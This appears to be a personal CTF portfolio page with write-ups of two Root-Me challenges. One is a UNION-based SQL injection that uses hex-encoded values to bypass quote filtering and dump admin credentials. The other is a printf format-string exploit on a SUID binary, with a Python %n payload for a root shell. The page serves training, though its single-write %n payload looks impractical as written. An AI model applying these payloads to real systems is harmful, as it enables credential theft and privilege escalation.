---
layout: page
title: Root-Me
subtitle: Diverse CTF challenges across multiple disciplines
permalink: /ctf/platforms/root-me/
---

<div class="platform-hero rm-hero">
  <div class="plat-hero-icon">🌱</div>
  <div class="plat-hero-text">
    <h2>Root-Me</h2>
    <p>A comprehensive French CTF platform offering hundreds of hacking challenges spanning web, systems, forensics, cryptology, and network security.</p>
    <div class="plat-hero-badges">
      <span class="badge badge-dark">Rank: Top 1000</span>
      <span class="badge badge-info">80+ Solves</span>
      <span class="badge badge-success">4000+ Points</span>
    </div>
  </div>
</div>

<div class="machine-filter-bar">
  <button class="mf-btn active" data-filter="all">All</button>
  <button class="mf-btn" data-filter="easy">Easy</button>
  <button class="mf-btn" data-filter="medium">Medium</button>
  <button class="mf-btn" data-filter="hard">Hard</button>
</div>

---

## Challenge List

<div class="machines-list">

  <div class="machine-card" data-os="web" data-diff="easy">
    <div class="mc-left"><span class="mc-os web">🌐</span><div><h4 class="mc-name">SQL Injection - Filter Bypass</h4><span class="mc-ip">Web-Server</span></div></div>
    <div class="mc-mid"><span class="mc-tech">Bypassing quote/slash sanitization · hex conversion of queries · database dump</span></div>
    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#sqli-bypass" class="mc-btn">Writeup ↓</a></div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="medium">
    <div class="mc-left"><span class="mc-os linux">🐧</span><div><h4 class="mc-name">ELF Format String - Basic</h4><span class="mc-ip">App-System</span></div></div>
    <div class="mc-mid"><span class="mc-tech">Overwriting global variable value in memory via printf() vulnerability · shell spawn</span></div>
    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#elf-fmt" class="mc-btn">Writeup ↓</a></div>
  </div>

</div>

---

## 📝 Challenge Solutions

### SQL Injection - Filter Bypass — Easy {#sqli-bypass}

#### Vulnerability Analysis
The search input sanitizes single quotes `'` and backslashes `\` to prevent basic SQL injections. However, the input is placed directly into a SQL query:
```sql
SELECT * FROM products WHERE category = $input;
```
Since the target parameter is numeric, we do not need single quotes to execute our payload!

#### Exploitation
We perform a UNION-based SQL injection to leak system information:
```sql
UNION SELECT 1, version(), 3, 4
```
To read data from a table containing string names (e.g. `users`) without single quotes, we represent the table name and column names in hexadecimal format:
```sql
UNION SELECT 1, username, password, 4 FROM users WHERE username = 0x61646d696e
# 0x61646d696e translates to 'admin'
```
We retrieve the administrative password hash, crack it, and flag the challenge.

---

### ELF Format String - Basic — Medium {#elf-fmt}

#### Vulnerability Analysis
A compiled SUID ELF binary prints user input directly inside the `printf` function:
```c
printf(argv[1]);
```
This is a format string vulnerability. The goal is to overwrite a global variable `key` to match `0xdeadbeef` to trigger the root shell branch.

#### Exploitation
We locate the memory address of the global variable `key` using `objdump`:
```bash
objdump -t binary | grep key
# Address: 0x080497ac
```
We test the stack alignment by sending multiple `%x` format specifiers:
```bash
./binary AAAA.%x.%x.%x.%x.%x.%x
# Prints: AAAA.b7fd3a00.b7fd3fc0.0.AAAA.302e4141
```
The string `AAAA` (0x41414141) is reflected at the 4th position on the stack.
We build a format string payload to write `0xdeadbeef` into `0x080497ac` using the `%n` specifier (which writes the number of characters printed so far to the address):

```python
import sys
# 0x080497ac (key address)
# value to write: 0xdeadbeef (or using short writes %hn)
sys.stdout.buffer.write(b"\xac\x97\x04\x08" + b"%3735928555x" + b"%4$n")
```

Running the binary with the payload triggers the admin check block, granting us a shell.

<script>
document.addEventListener('DOMContentLoaded', function() {
  const filterBtns = document.querySelectorAll('.machine-filter-bar .mf-btn');
  const machineCards = document.querySelectorAll('.machine-card');
  filterBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const filter = this.dataset.filter;
      filterBtns.forEach(b => b.classList.remove('active'));
      this.classList.add('active');
      machineCards.forEach(card => {
        if (filter === 'all' || card.dataset.os === filter || card.dataset.diff === filter) {
          card.style.display = 'flex';
        } else {
          card.style.display = 'none';
        }
      });
    });
  });
});
</script>
